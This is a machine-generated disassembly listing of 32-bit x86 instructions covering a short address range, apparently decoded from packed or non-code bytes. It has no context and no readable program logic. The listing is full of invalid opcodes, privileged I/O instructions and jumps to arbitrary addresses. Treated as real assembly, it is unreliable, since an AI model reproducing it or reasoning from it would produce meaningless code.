  41319f:	stos   DWORD PTR es:[edi],eax
  4131a0:	cmp    eax,0xc692435d
  4131a5:	or     BYTE PTR [ebp+0x5e],dh
  4131a8:	inc    edi
  4131a9:	cld    
  4131aa:	and    al,0xd
  4131ac:	xor    dl,BYTE PTR [esi+0x23]
  4131af:	cmc    
  4131b0:	xor    DWORD PTR [ecx+0x2a],edx
  4131b3:	xchg   esp,eax
  4131b4:	xor    al,0xc
  4131b6:	in     al,dx
  4131b7:	or     BYTE PTR es:[ecx+0x50d8ec7a],cl
  4131be:	jge    0x4131d8
  4131c0:	fst    DWORD PTR [ebx]
  4131c2:	xor    eax,0x5c0041d8
  4131c7:	test   BYTE PTR [edi],0x73
  4131ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131cb:	mov    dl,0x50
  4131cd:	cld    
  4131ce:	add    DWORD PTR [ebp-0x17f0a9ce],ecx
  4131d4:	imul   eax,DWORD PTR [ecx],0x23
  4131d7:	cmc    
  4131d8:	ins    DWORD PTR es:[edi],dx
  4131d9:	or     dh,BYTE PTR [edx-0x32]
  4131dc:	aad    0xfd
  4131de:	add    BYTE PTR [edx],0x7b
  4131e1:	repnz mov ds:0xecc46402,al
  4131e7:	ds push ebx
  4131e9:	push   eax
  4131ea:	jge    0x413175
  4131ec:	fbstp  TBYTE PTR [ebx]
  4131ee:	dec    eax
  4131ef:	xor    ebp,edi
  4131f1:	out    dx,al
  4131f2:	adc    DWORD PTR [ecx+0x42f20bac],ecx
  4131f8:	fist   WORD PTR [ebx+0x0]
  4131fe:	add    BYTE PTR [edx],dh
  413200:	call   0xe63d6388
  413205:	push   0xffffffe0
  413207:	sbb    eax,0xc031b431
  41320c:	push   0x4e756be8
  413211:	aad    0xfc
  413213:	adc    ch,BYTE PTR [edx]
  413215:	popf   
  413216:	add    esi,DWORD PTR [ebp-0x77]
  413219:	jno    0x442b812d
  41321f:	fadd   QWORD PTR [esi-0x1]
  413222:	cmp    al,0x40
  413224:	add    ah,bh
  413226:	jg     0x4131dd
  413228:	dec    ebp
  413229:	sbb    ebp,DWORD PTR [esi-0x36]
  41322c:	aam    0xfc
  41322e:	pop    edi
  41322f:	addr16 inc edx
  413231:	out    0x33,eax
  413233:	enter  0x46ee,0xf6
  413237:	add    BYTE PTR [edx],0x72
  41323a:	adc    BYTE PTR [ebp-0x13fbd90f],dl
  413240:	mov    edx,ebx
  413242:	add    esi,DWORD PTR [ebp+0x31]
  413245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413246:	adc    BYTE PTR [ecx-0x52],ch
  413249:	sub    al,BYTE PTR [eax+ebx*4]
  41324c:	stos   DWORD PTR es:[edi],eax
  41324d:	push   esi
  41324e:	add    eax,0xeee7d492
  413253:	jnp    0x41323f
  413255:	popa   
  413256:	add    BYTE PTR [eax+0x46db1ad4],0xe
  41325d:	add    BYTE PTR [ebp-0x6802fd45],bl
  413263:	add    BYTE PTR [eax],al
  413265:	add    BYTE PTR [eax],al
  413267:	add    BYTE PTR [ebx-0x5aa88b43],cl
  41326d:	jmp    0x2931:0xd63f6660
  413274:	(bad)  
  413275:	xor    al,0x5b
  413277:	mov    dl,0xfb
  413279:	fistp  WORD PTR [ebx+0x2b]
  41327c:	inc    edx
  41327d:	aam    0x54
  41327f:	ins    BYTE PTR es:[edi],dx
  413280:	rcr    BYTE PTR [esi],cl
  413282:	mov    WORD PTR [eax+0x1a],gs
  413285:	jmp    0x41328b
  413287:	jmp    0x42726402
  41328c:	imul   edx,ebp,0x13
  41328f:	test   DWORD PTR [eax],esp
  413291:	adc    al,0x0
  413293:	mov    ecx,0xfb5ff02f
  413298:	mov    dh,0x2
  41329a:	push   0xffffffe8
  41329c:	mov    ss,ebx
  41329e:	jno    0x413257
  4132a0:	stc    
  4132a1:	(bad)  [eax-0x78fd8964]
  4132a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132a8:	push   edx
  4132a9:	sbb    ecx,eax
  4132ab:	pop    esp
  4132ac:	jno    0x4132bf
  4132ae:	shr    BYTE PTR [ecx],0xce
  4132b1:	iret   
  4132b2:	add    cl,ch
  4132b4:	jbe    0x4132e2
  4132b6:	push   ecx
  4132b7:	pop    esp
  4132b8:	mov    bh,BYTE PTR [esi+0x50]
  4132bb:	push   ecx
  4132bc:	cwde   
  4132bd:	or     ah,BYTE PTR [edx]
  4132bf:	mov    esi,0xe95341c9
  4132c4:	jbe    0x41324d
  4132c6:	mov    bl,0x5f
  4132c8:	enter  0xfdd5,0x91
  4132cc:	add    BYTE PTR [eax],al
  4132ce:	add    BYTE PTR [eax],al
  4132d0:	add    dh,dl
  4132d2:	and    eax,DWORD PTR [eax]
  4132d4:	jmp    0xe940a474
  4132d9:	jbe    0x413343
  4132db:	adc    al,0x39
  4132dd:	inc    eax
  4132de:	xchg   DWORD PTR [ebx+0x0],esi
  4132e1:	push   eax
  4132e2:	jge    0x4132ac
  4132e4:	jmp    esp
  4132e6:	arpl   WORD PTR [ebx-0x3fac1401],ax
  4132ec:	jle    0x413327
  4132ee:	xchg   dh,al
  4132f0:	push   eax
  4132f1:	inc    esp
  4132f2:	ja     0x4132bd
  4132f4:	inc    ebx
  4132f5:	dec    esp
  4132f6:	jl     0x413279
  4132f8:	jl     0x4132a3
  4132fa:	mov    ecx,0x46b450fb
  4132ff:	cmp    bh,0xbb
  413302:	push   ebx
  413303:	ror    BYTE PTR [edi],0xa1
  413306:	mov    esi,0x7f1c33a
  41330b:	das    
  41330c:	shl    BYTE PTR [edx],0x88
  41330f:	cmp    DWORD PTR [ecx+ebx*2-0x47],0xff6ab9fb
  413317:	(bad)  
  413318:	call   FWORD PTR [ecx+0x7bfb8e53]
  41331e:	mov    ecx,0x47cc1888
  413323:	jno    0x41331f
  413325:	mov    DWORD PTR [ebx+0x7c],edx
  413328:	std    
  413329:	jmp    0x4132e4
  41332b:	push   eax
  41332c:	inc    ecx
  41332e:	jb     0x41333f
  413330:	inc    eax
  413331:	int3   
  413332:	jnp    0x4132b5
  413334:	jl     0x413336
  413336:	add    BYTE PTR [eax],al
  413338:	add    BYTE PTR [eax],al
  41333a:	mov    ecx,0xab50fbb9
  41333f:	jecxz  0x4132ce
  413341:	adc    bl,BYTE PTR [esi+edi*8-0x1983ba7c]
  413348:	inc    esp
  413349:	push   esi
  41334a:	int3   
  41334b:	inc    BYTE PTR [ebx+0x531470c0]
  413351:	lea    esp,[ecx-0x1a]
  413354:	mov    eax,0xfffe8ca8
  413359:	out    0x83,eax
  41335b:	or     edi,ebp
  41335d:	push   DWORD PTR [ebp+0x60]
  413360:	push   cs
  413361:	and    BYTE PTR [esi+0x29],ah
  413364:	add    al,0xb9
  413366:	lods   eax,DWORD PTR ds:[esi]
  413367:	call   0x5467336d
  41336c:	push   cs
  41336d:	xor    al,0x49
  41336f:	sbb    eax,0x2f43fd04
  413374:	pop    esp
  413375:	cmp    bl,BYTE PTR [esi-0x11cfb1e0]
  41337b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41337c:	push   ecx
  41337d:	mov    edi,DWORD PTR [ecx-0x4f78fc25]
  413383:	stos   DWORD PTR es:[edi],eax
  413384:	fdiv   DWORD PTR [ebx-0x3b]
  413387:	push   esi
  413388:	jle    0x413406
  41338a:	cmp    BYTE PTR [ecx],dl
  41338c:	fcom   DWORD PTR [eax-0x61]
  41338f:	fiadd  DWORD PTR [esi-0x79940ebd]
  413395:	inc    ebx
  413396:	or     eax,0x979fe98c
  41339b:	fild   DWORD PTR [ecx]
  41339d:	push   ecx
  41339e:	add    BYTE PTR [eax],al
  4133a0:	add    BYTE PTR [eax],al
  4133a2:	add    BYTE PTR [edx],dl
  4133a4:	scas   eax,DWORD PTR es:[edi]
  4133a5:	or     eax,0xd8dbb6d4
  4133aa:	(bad)  
  4133ab:	and    BYTE PTR ds:[ebp-0x26],cl
  4133af:	call   0x7fc4:0xdd6c4bd0
  4133b6:	std    
  4133b7:	jmp    0xbf5c:0x3e5ec18c
  4133be:	je     0x41336c
  4133c0:	popf   
  4133c1:	add    BYTE PTR [eax],al
  4133c3:	sub    BYTE PTR [eax+ebp*8+0x4f],ah
  4133c7:	sbb    DWORD PTR es:0xc6ef8089,ebp
  4133ce:	inc    ecx
  4133cf:	jne    0x41339d
  4133d1:	mov    edx,0x4f434651
  4133d6:	sbb    al,0x34
  4133d8:	(bad)  [edx]
  4133da:	mov    DWORD PTR [edx+0x22fb8f02],ebp
  4133e0:	rcr    DWORD PTR [esi-0x7da5dbcd],1
  4133e6:	clc    
  4133e7:	dec    ebx
  4133e8:	add    bh,BYTE PTR [edx]
  4133ea:	mov    WORD PTR [esi],?
  4133ec:	ror    DWORD PTR [edi+0x7ed0fd0b],1
  4133f2:	sbb    al,0xce
  4133f4:	sar    esp,1
  4133f6:	or     ebp,DWORD PTR [edi-0x5a000b3b]
  4133fc:	ret    0x352
  4133ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413400:	ret    0x36a7
  413403:	mov    bl,0x2d
  413405:	and    bl,al
  413407:	add    BYTE PTR [eax],al
  413409:	add    BYTE PTR [eax],al
  41340b:	add    BYTE PTR [esi+0x51853b7d],ah
  413411:	mov    dl,0xe7
  413413:	add    esi,DWORD PTR [ebp+0x35]
  413416:	xchg   ebp,eax
  413417:	cs lahf 
  413419:	add    ah,BYTE PTR [ecx+eax*4+0x65]
  41341d:	shr    DWORD PTR [esi],1
  41341f:	xlat   BYTE PTR ds:[ebx]
  413420:	lds    ebx,FWORD PTR [edx-0x36]
  413423:	or     edx,DWORD PTR [edi-0x2f]
  413426:	(bad)  
  413428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413429:	add    ah,bh
  41342b:	mov    BYTE PTR [esi+0x75ac4f6a],al
  413431:	add    ah,bh
  413433:	jmp    0x413407
  413435:	sub    eax,0xada703e8
  41343a:	ss add eax,0x89670275
  413440:	not    BYTE PTR [ecx]
  413442:	out    0xd6,al
  413444:	fdiv   DWORD PTR [ecx]
  413446:	ins    BYTE PTR es:[edi],dx
  413447:	inc    eax
  413448:	in     eax,dx
  413449:	xor    DWORD PTR [esi],edi
  41344b:	xlat   BYTE PTR ds:[ebx]
  41344c:	data16 mov ds:0x877543fa,al
  413452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413453:	push   eax
  413454:	xor    al,0x5a
  413456:	mov    bl,0x4
  413458:	jne    0x41345c
  41345a:	add    BYTE PTR [esi+0x2912b0a5],dh
  413460:	jns    0x4134df
  413462:	inc    ebx
  413463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413464:	pop    sp
  413466:	call   DWORD PTR [edx]
  413468:	jns    0x4134e7
  41346a:	inc    ebx
  41346b:	jno    0x4134b3
  41346d:	aaa    
  41346e:	xchg   DWORD PTR [eax+eax*1],ecx
  413471:	add    BYTE PTR [eax],al
  413473:	add    BYTE PTR [eax],al
  413475:	popf   
  413476:	into   
  413477:	adc    ecx,ebp
  413479:	xchg   BYTE PTR [eax],dl
  41347b:	add    BYTE PTR [esi+esi*1+0x54],ah
  41347f:	pcmpgtb mm6,mm5
  413482:	adc    bh,ch
  413484:	outs   dx,BYTE PTR ds:[esi]
  413485:	dec    ebx
  413486:	xor    ecx,DWORD PTR [ebx-0x6624bd24]
  41348c:	retf   
  41348d:	jbe    0x413491
  41348f:	jmp    0x8503997f
  413494:	sub    DWORD PTR [edx-0x9d50200],esi
  41349a:	leave  
  41349b:	add    edi,DWORD PTR [ebx-0x693feaed]
  4134a1:	pusha  
  4134a2:	sub    edi,eax
  4134a4:	sub    al,BYTE PTR [esi]
  4134a6:	shr    dl,1
  4134a8:	push   ds
  4134a9:	inc    ebx
  4134aa:	adc    al,0xec
  4134ac:	sub    eax,0xcbe802b7
  4134b1:	mov    ds:0x36dafdcd,al
  4134b6:	mov    ds:0x2b735ec,al
  4134bb:	mov    eax,ds:0x41bbf9
  4134c0:	dec    edx
  4134c1:	mov    edx,0xb7e941be
  4134c6:	xor    ecx,DWORD PTR [ecx+0x24def4d5]
  4134cc:	jo     0x413508
  4134ce:	loop   0x413459
  4134d0:	and    al,0x79
  4134d2:	xchg   DWORD PTR [ebx-0x3b],ecx
  4134d5:	in     al,dx
  4134d6:	cmp    ecx,DWORD PTR [eax+eax*1]
  4134d9:	add    BYTE PTR [eax],al
  4134db:	add    BYTE PTR [eax],al
  4134dd:	add    BYTE PTR [ebp+0x47],al
  4134e0:	call   0x87179670
  4134e5:	dec    ebp
  4134e6:	mov    al,0x81
  4134e8:	enter  0x4101,0x47
  4134ec:	fsub   QWORD PTR [esi-0x35]
  4134ef:	paddusb mm4,QWORD PTR [ebx]
  4134f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134f3:	jl     0x413536
  4134f5:	clc    
  4134f6:	hlt    
  4134f7:	std    
  4134f8:	mov    edi,?
  4134fa:	repz mov ebx,0x208c0cc2
  413500:	xchg   esp,ebp
  413502:	(bad)  
  413504:	adc    al,0x83
  413506:	jns    0x4134be
  413508:	add    BYTE PTR [ebx+0x56080751],al
  41350e:	sbb    edi,DWORD PTR [edx+0x79]
  413511:	or     BYTE PTR [edx+0x2900fb0f],bl
  413517:	(bad)  
  413518:	mov    BYTE PTR [edi+0x20],al
  41351b:	and    BYTE PTR [ecx-0x8],0x4c
  41351f:	push   eax
  413520:	shl    BYTE PTR [eax+ecx*2+0x7a],0x4b
  413525:	or     BYTE PTR [edi+0x1080f83f],dl
  41352b:	hlt    
  41352c:	ss je  0x413553
  41352f:	mov    dh,0x41
  413531:	clc    
  413532:	adc    eax,0x7372f810
  413537:	jns    0x4135aa
  413539:	adc    BYTE PTR [ebp+0x7683f41f],dl
  41353f:	cli    
  413540:	or     al,BYTE PTR [edx+0x0]
  413546:	add    cl,ah
  413548:	add    eax,DWORD PTR [eax]
  41354a:	add    BYTE PTR [edi-0x30],dl
  41354d:	cmp    al,0xc0
  413550:	add    eax,0x2ccf582
  413555:	add    BYTE PTR [ebx],bh
  413557:	cdq    
  413558:	mov    dl,0xb
  41355a:	xchg   DWORD PTR [ebp-0x3b],esi
  41355d:	add    DWORD PTR [eax],eax
  41355f:	jne    0x4135c5
  413561:	inc    ebx
  413562:	add    al,0xf0
  413564:	adc    eax,0x9ff90d08
  413569:	add    DWORD PTR [eax],eax
  41356b:	jne    0x4134fd
  41356d:	ret    0x7500
  413570:	fld    st(1)
  413572:	or     eax,0x19bf1
  413577:	jne    0x4135d2
  413579:	push   esi
  41357a:	std    
  41357b:	jne    0x41356a
  41357d:	pop    es
  41357e:	cmc    
  41357f:	mov    ah,0xd8
  413581:	add    DWORD PTR [eax],eax
  413583:	xor    eax,0x75af7dd8
  413588:	fild   DWORD PTR [ecx]
  41358a:	mov    DWORD PTR [ebx+ebx*2-0x21],eax
  41358e:	add    BYTE PTR [ebp-0x25],dh
  413591:	xor    DWORD PTR [esi+esi*2+0x64],0xa6fef03e
  413599:	add    eax,0x49a3c148
  41359e:	je     0x413520
  4135a0:	mov    ds:0x58847449,eax
  4135a5:	jmp    0x7f48deae
  4135aa:	call   0x4135af
  4135af:	add    BYTE PTR [ebp-0x71],bh
  4135b2:	in     al,dx
  4135b3:	or     BYTE PTR ds:0xf18304ac,0xdb
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	aam    0xa7
  4135be:	enter  0x7541,0xb0
  4135c2:	cmp    ecx,DWORD PTR [eax]
  4135c4:	mov    BYTE PTR [ecx+0x7e],dh
  4135c7:	ror    BYTE PTR [esi],cl
  4135c9:	dec    esp
  4135ca:	mov    BYTE PTR [ebp-0x7b],al
  4135cd:	push   eax
  4135ce:	inc    esp
  4135cf:	adc    al,0xde
  4135d1:	xchg   edx,eax
  4135d2:	mov    BYTE PTR [ebp+0x6d],al
  4135d5:	pusha  
  4135d6:	inc    esi
  4135d7:	clc    
  4135d8:	into   
  4135d9:	add    bl,BYTE PTR [eax]
  4135db:	jg     0x413611
  4135dd:	es jb  0x41361f
  4135e0:	popf   
  4135e1:	fld    DWORD PTR [eax]
  4135e3:	jg     0x413619
  4135e5:	repnz popa 
  4135e7:	aas    
  4135e8:	popa   
  4135e9:	(bad)  [eax]
  4135eb:	jle    0x413621
  4135ed:	jmp    0xc5bd:0xfa26c462
  4135f4:	jne    0x4135e8
  4135f6:	out    0x3,al
  4135f8:	es (bad) 
  4135fa:	loop   0x413600
  4135fc:	push   es
  4135fd:	inc    ecx
  4135fe:	xchg   esi,eax
  4135ff:	lds    esi,FWORD PTR [ebp+0x22]
  413602:	out    0x3,eax
  413604:	or     DWORD PTR [ecx],ecx
  413606:	bound  eax,QWORD PTR [edi+0x6d]
  413609:	jns    0x41363d
  41360b:	add    ah,bh
  41360d:	repz imul ecx,esi,0x86c85679
  413614:	add    BYTE PTR [eax],al
  413616:	add    BYTE PTR [eax],al
  413618:	add    BYTE PTR [edi-0xa],bl
  41361b:	hlt    
  41361c:	sbb    al,0xf4
  41361e:	mov    edi,0xf2ab0d5b
  413623:	shl    DWORD PTR [edx+edi*4],cl
  413626:	xor    ah,BYTE PTR [edx+ecx*2+0x71]
  41362a:	xor    bl,BYTE PTR [edx]
  41362c:	ror    DWORD PTR [ebp-0x4],cl
  41362f:	xor    al,0x4
  413631:	jne    0x4136ac
  413633:	mov    esp,0xafc1f7fb
  413638:	add    BYTE PTR [eax],ch
  41363a:	inc    esp
  41363b:	jecxz  0x413640
  41363d:	jne    0x413641
  41363f:	addr16 pop eax
  413641:	pop    esp
  413642:	les    esp,FWORD PTR [edx+edx*8+0x1ced780a]
  413649:	mov    dh,0xd6
  41364b:	jmp    0x81ff:0xfb4ef4d3
  413652:	and    edi,0xcce8d2
  413658:	imul   eax,DWORD PTR [edi+ecx*8+0x0],0xc0136f74
  413660:	and    BYTE PTR [edx+edx*8],bh
  413663:	jae    0x41364f
  413665:	arpl   dx,ax
  413667:	inc    eax
  413668:	ss xchg ebp,eax
  41366b:	ret    0x76dd
  41366e:	adc    al,al
  413670:	ror    ah,cl
  413672:	xor    BYTE PTR [ecx+0x58ddf1cd],cl
  413678:	in     al,dx
  413679:	jbe    0x41367d
  41367b:	push   ecx
  41367c:	pop    ss
  41367d:	add    BYTE PTR [eax],al
  41367f:	add    BYTE PTR [eax],al
  413681:	add    BYTE PTR [esi+0x7b],bl
  413684:	jnp    0x413677
  413686:	adc    eax,DWORD PTR [edi+0x40]
  413689:	fs mov dh,0x50
  41368c:	add    eax,0x77e4b6db
  413691:	in     eax,0x76
  413693:	add    ch,BYTE PTR [eax-0x17]
  413696:	jbe    0x41369a
  413698:	adc    BYTE PTR [ecx],dl
  41369a:	inc    ebx
  41369b:	xor    BYTE PTR [eax],al
  41369d:	jmp    0x7d9cae48
  4136a2:	ds xor esi,edx
  4136a5:	call   0x9d84ba20
  4136aa:	std    
  4136ab:	ret    0x3674
  4136ae:	sti    
  4136af:	inc    edi
  4136b0:	in     al,dx
  4136b1:	loope  0x41366c
  4136b3:	aas    
  4136b4:	call   0x44d2faf
  4136b9:	jmp    0x62431034
  4136be:	lods   eax,DWORD PTR ds:[esi]
  4136bf:	fimul  DWORD PTR [ecx+0x8d3f3e1]
  4136c5:	idiv   al
  4136c7:	sbb    eax,DWORD PTR [ecx+ebp*8]
  4136ca:	jbe    0x4136d5
  4136cc:	dec    ebx
  4136cd:	add    eax,0xe5288577
  4136d2:	jbe    0x4136d6
  4136d4:	add    DWORD PTR [eax],0x8b4dc79c
  4136da:	in     eax,dx
  4136db:	test   esi,ebp
  4136dd:	or     dh,dh
  4136df:	pop    ds
  4136e0:	push   0x0
  4136e2:	push   edi
  4136e3:	mov    DWORD PTR [edi+0xdf],eax
  4136e9:	add    BYTE PTR [eax],al
  4136eb:	inc    ebp
  4136ec:	xor    esp,eax
  4136ee:	mov    DWORD PTR [ecx-0x55d91726],edx
  4136f4:	mov    cl,0xfb
  4136f6:	test   BYTE PTR [edx+eax*1],cl
  4136f9:	test   BYTE PTR [ebp-0x1000061],ah
  4136ff:	popa   
  413700:	fiadd  DWORD PTR [edi+0x69ff36d6]
  413706:	add    BYTE PTR [esi+edx*8+0x7adbfffb],dh
  41370d:	ror    BYTE PTR [edi],0x10
  413710:	cmp    edi,0x71b28cff
  413716:	in     al,0x17
  413718:	mov    BYTE PTR [edx+0x2],ch
  41371b:	xchg   BYTE PTR [esi],al
  41371d:	call   0xfbf3211c
  413722:	test   BYTE PTR [ecx+eax*1],cl
  413725:	test   BYTE PTR [ecx+0x4f],bh
  413728:	(bad)  
  413729:	(bad)  
  41372a:	(bad)  
  41372b:	xor    ebx,esp
  41372d:	xchg   esi,edx
  41372f:	add    ebp,DWORD PTR es:[edx+0x0]
  413733:	mov    ah,0xda
  413735:	stc    
  413736:	jmp    FWORD PTR [ebx-0x5ff03f86]
  41373c:	gs (bad) 
  41373e:	call   FWORD PTR [esi+ecx*2]
  413741:	pop    ebx
  413742:	or     al,0x97
  413744:	cmp    DWORD PTR [eax],ecx
  413746:	mov    ecx,edx
  413748:	mov    dl,0x81
  41374a:	fcmovnbe st,st(5)
  41374c:	int    0x4d
  41374e:	inc    DWORD PTR [eax]
  413750:	add    BYTE PTR [eax],al
  413752:	add    BYTE PTR [eax],al
  413754:	add    DWORD PTR [ebx-0x268abfee],ebp
  41375a:	jl     0x413734
  41375c:	lock rsqrtps xmm6,XMMWORD PTR ds:0x50b19e00
  413764:	pop    edi
  413765:	mov    cl,bl
  413767:	loope  0x4137b7
  413769:	fiadd  DWORD PTR [ecx]
  41376b:	mov    DWORD PTR [eax],ebp
  41376d:	jmp    0xd9029af4
  413772:	jp     0x4137bf
  413774:	mov    cl,0x9
  413776:	jnp    0x413740
  413778:	mov    ebx,0xec00c41d
  41377d:	and    eax,0xab18e8bc
  413782:	add    DWORD PTR [eax],eax
  413784:	icebp  
  413785:	cwde   
  413786:	add    BYTE PTR [ebx+0x1d8a1],al
  41378c:	call   0x8f29fba6
  413791:	int    0x1
  413793:	add    dh,bh
  413795:	cmc    
  413796:	jecxz  0x413721
  413798:	and    BYTE PTR [ebp-0x39],bh
  41379b:	inc    ebx
  41379c:	jle    0x413776
  41379e:	mov    DWORD PTR [ebx+0x66],0x61737adc
  4137a5:	pop    ebp
  4137a6:	iret   
  4137a7:	or     al,0x72
  4137a9:	pop    ebp
  4137aa:	add    dh,BYTE PTR es:[ebp-0x25]
  4137ae:	jl     0x4137b1
  4137b0:	mul    BYTE PTR [ebx-0x3]
  4137b3:	or     al,0xf7
  4137b5:	add    eax,0x6
  4137ba:	add    BYTE PTR [eax],al
  4137bc:	add    BYTE PTR [ebp-0xc],dh
  4137bf:	inc    esp
  4137c0:	hlt    
  4137c1:	push   0x60
  4137c3:	repnz add DWORD PTR [ebp-0x25],esi
  4137c7:	jl     0x413812
  4137c9:	jno    0x4137db
  4137cb:	ret    0x7500
  4137ce:	(bad)  [ecx]
  4137d0:	or     eax,0x20af1
  4137d5:	jne    0x4137d9
  4137d7:	push   0xffffffcb
  4137d9:	jns    0x4137d4
  4137db:	fild   DWORD PTR fs:[edx]
  4137de:	retf   0xd9e7
  4137e1:	mov    edx,0xd087de03
  4137e6:	add    esp,edi
  4137e8:	add    edi,edi
  4137ea:	inc    ecx
  4137eb:	fild   WORD PTR [edi-0x2720b04b]
  4137f1:	sbb    al,BYTE PTR [ebx]
  4137f3:	xlat   BYTE PTR ds:[ebx]
  4137f4:	add    esi,DWORD PTR [ebp+0x4f]
  4137f7:	sti    
  4137f8:	bswap  edx
  4137fa:	clc    
  4137fb:	arpl   WORD PTR [edx+eax*8-0x5291837],di
  413802:	add    al,BYTE PTR [edi]
  413804:	add    al,0x75
  413806:	stc    
  413807:	push   0xffffff90
  413809:	stos   BYTE PTR es:[edi],al
  41380a:	leave  
  41380b:	out    0x83,eax
  41380d:	push   ds
  41380e:	aad    0xe7
  413810:	(bad)  
  413811:	not    eax
  413813:	out    0x3,eax
  413815:	jne    0x413873
  413817:	jmp    0x80ca:0x4d8ffe2e
  41381e:	leave  
  41381f:	jg     0x41388e
  413821:	add    BYTE PTR [eax],al
  413823:	add    BYTE PTR [eax],al
  413825:	add    BYTE PTR [ecx+0x2],cl
  413828:	out    0x7a,eax
  41382a:	fimul  DWORD PTR gs:[ebp-0x44fd8a5a]
  413831:	pop    es
  413832:	in     al,0x5
  413834:	add    DWORD PTR [edx],eax
  413836:	mov    eax,0x52b26577
  41383b:	leave  
  41383c:	out    0x59,eax
  41383e:	popa   
  41383f:	xor    dl,cl
  413841:	add    ebp,esi
  413843:	mov    ?,WORD PTR [edi+0x6ac938ce]
  413849:	mov    esp,0x81c1da30
  41384e:	sub    cl,cl
  413850:	les    esi,FWORD PTR fs:[eax+0x78]
  413854:	add    BYTE PTR [ebx+0x71],dl
  413857:	add    al,BYTE PTR [eax]
  413859:	push   0x42
  41385b:	add    al,0x73
  41385d:	mov    edi,0x1e4094f5
  413862:	xor    al,bh
  413864:	mov    eax,0x2715f
  413869:	add    DWORD PTR [ebx],edx
  41386b:	sub    bh,bh
  41386d:	call   0xfea9bd67
  413872:	mov    bl,0xc6
  413874:	push   eax
  413875:	bound  esi,QWORD PTR [ebx-0x787a16cf]
  41387b:	(bad)  
  41387c:	jae    0x41385b
  41387e:	add    bh,0x13
  413881:	int    0xc4
  413883:	or     BYTE PTR [eax],al
  413885:	cmp    DWORD PTR [edi],ebx
  413887:	cli    
  413888:	push   edi
  413889:	bound  eax,QWORD PTR [eax]
  41388b:	add    BYTE PTR [eax],al
  41388d:	add    BYTE PTR [eax],al
  41388f:	lock fldcw WORD PTR [ecx-0x3b]
  413893:	mov    ebx,0x3da984c6
  413898:	repz mov ch,BYTE PTR [ecx+esi*4]
  41389c:	fstp   DWORD PTR [ecx]
  41389e:	aam    0x76
  4138a0:	add    cl,BYTE PTR [ecx+0x73cffd99]
  4138a6:	shl    DWORD PTR [ecx-0x54690128],0x7c
  4138ad:	jae    0x413858
  4138af:	dec    esi
  4138b0:	xlat   BYTE PTR ds:[ebx]
  4138b1:	adc    al,0xe9
  4138b3:	jbe    0x413894
  4138b5:	(bad)  
  4138b6:	jmp    0x5377:0x76810276
  4138bd:	sbb    DWORD PTR [ebp+ebp*8-0x62],ebx
  4138c1:	(bad)  
  4138c2:	cmp    cx,WORD PTR [ebx+0x276e9b5]
  4138c9:	call   0xfe08c788
  4138ce:	pop    esp
  4138cf:	std    
  4138d0:	pop    edx
  4138d1:	std    
  4138d2:	add    BYTE PTR [ebx+0x5a8b50b8],dh
  4138d8:	lods   al,BYTE PTR ds:[esi]
  4138d9:	lahf   
  4138da:	lea    ecx,[ecx+0x63fffb2b]
  4138e0:	adc    edi,ebx
  4138e2:	jne    0x4138e8
  4138e4:	add    DWORD PTR [ecx-0x4479f64],0x50
  4138eb:	je     0x413954
  4138ed:	jp     0x4138ee
  4138ef:	cmp    DWORD PTR [edx-0x40],0xf
  4138f3:	add    BYTE PTR [eax],al
  4138f5:	add    BYTE PTR [eax],al
  4138f7:	add    BYTE PTR [ecx-0x3d],cl
  4138fa:	test   al,al
  4138fc:	imul   eax,esi,0x46eac030
  413902:	sbb    DWORD PTR [eax+eiz*8-0x5d46044b],0x51000003
  41390d:	jg     0x4138bd
  41390f:	cli    
  413910:	mov    ds:0x9c00c6b5,eax
  413915:	inc    ebx
  413916:	inc    ebp
  413917:	jne    0x4138ce
  413919:	rol    BYTE PTR [ecx-0xd],0x8d
  41391d:	dec    edx
  41391e:	inc    DWORD PTR [edx-0x72affd4c]
  413924:	pop    edi
  413925:	add    dl,BYTE PTR [eax-0x73]
  413928:	push   ecx
  413929:	dec    esi
  41392a:	das    
  41392b:	shl    ah,0x35
  41392e:	add    DWORD PTR [ecx],0xfc07f8c
  413934:	fdivr  DWORD PTR [edx-0x3]
  413937:	call   FWORD PTR [edx+esi*8-0x6]
  41393b:	(bad)  
  41393c:	shr    DWORD PTR [edx-0xe1c0002],1
  413942:	cmc    
  413943:	mov    bl,BYTE PTR [eax-0x5c177011]
  413949:	test   bl,bh
  41394b:	call   FWORD PTR [edx]
  41394d:	cmp    BYTE PTR [ebp-0x31a38afc],0x10
  413954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413955:	pop    es
  413956:	xadd   BYTE PTR [ebx+0x8b0152],dl
  41395d:	add    BYTE PTR [eax],al
  41395f:	add    BYTE PTR [eax],al
  413961:	mov    al,0xe5
  413963:	xor    BYTE PTR [edx+0x74],ch
  413966:	push   0x14f18b7e
  41396b:	retf   
  41396c:	std    
  41396d:	int    0xd9
  41396f:	add    DWORD PTR [eax],eax
  413971:	cmc    
  413972:	mov    DWORD PTR [ecx],esi
  413974:	lds    esi,FWORD PTR [eax+0x75000811]
  41397a:	fnstcw WORD PTR [edx+0x43]
  41397d:	leave  
  41397e:	pop    ebx
  41397f:	mov    esi,0x25ade2fd
  413984:	adc    BYTE PTR ds:0x48c086d9,dh
  41398a:	mov    ds:0x8ad437e,eax
  41398f:	jge    0x4139d4
  413991:	std    
  413992:	or     BYTE PTR [ebx],dh
  413994:	push   ebp
  413995:	call   0xb3400eef
  41399a:	mov    bh,0x31
  41399c:	std    
  41399d:	and    BYTE PTR [ebp-0x56aaec34],bl
  4139a3:	inc    ecx
  4139a4:	add    BYTE PTR [edx-0x4a7c4ffb],bl
  4139aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ab:	inc    ebp
  4139ac:	jae    0x41395b
  4139ae:	lahf   
  4139af:	mul    BYTE PTR [edi]
  4139b1:	sbb    DWORD PTR gs:[ecx+eax*4],eax
  4139b5:	jnp    0x41398b
  4139b7:	push   esi
  4139b8:	sbb    al,0xac
  4139ba:	lock sti 
  4139bc:	or     al,0xf1
